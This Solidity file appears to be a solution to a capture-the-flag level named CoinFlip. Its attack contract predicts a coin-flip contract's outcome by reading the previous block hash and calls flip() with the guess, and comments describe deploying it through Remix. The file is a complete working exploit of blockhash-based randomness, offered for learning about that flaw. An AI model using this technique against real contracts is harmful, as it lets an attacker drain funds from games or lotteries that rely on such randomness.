// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

// ! I was not able to make it work on a foundry script
// ! ended up using the remix IDE to deploy the contract and call the attack function
contract CoinFlipAttack is Broadcasted {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address payable coinFlipCtr_) public payable override {
        guessFlip(coinFlipCtr_);
    }

    function guessFlip(address coinFlipCtr_) public payable {
        uint256 _blockValue = uint256(blockhash(block.number - 1));

        uint256 _coinFlip = _blockValue / FACTOR;
        ICoinFlip(coinFlipCtr_).flip(_coinFlip == 1);
    }
}

interface ICoinFlip {
    // ! guess the result 10 times in a row (but in different blocks)
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}
